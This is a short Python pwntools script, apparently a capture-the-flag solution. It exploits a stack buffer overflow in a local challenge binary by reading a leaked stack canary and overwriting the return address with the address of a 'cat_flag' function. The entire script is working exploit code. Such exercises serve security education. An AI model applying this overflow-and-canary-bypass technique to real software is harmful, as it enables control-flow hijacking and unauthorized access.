from pwn import *
context.log_level = 'debug'
p = process('./Bufferoverflow-homemade-cookie-v3')
elf = ELF('./Bufferoverflow-homemade-cookie-v3')
canary = int(p.recvline(False),16)
log.info('canary: ' + hex(canary))

payload = b'a' * 16 + p32(canary)
payload += p32(0)
payload += p32(0)
payload += p32(0)
payload += p32(elf.sym['cat_flag'])

p.sendline(payload)
p.interactive()

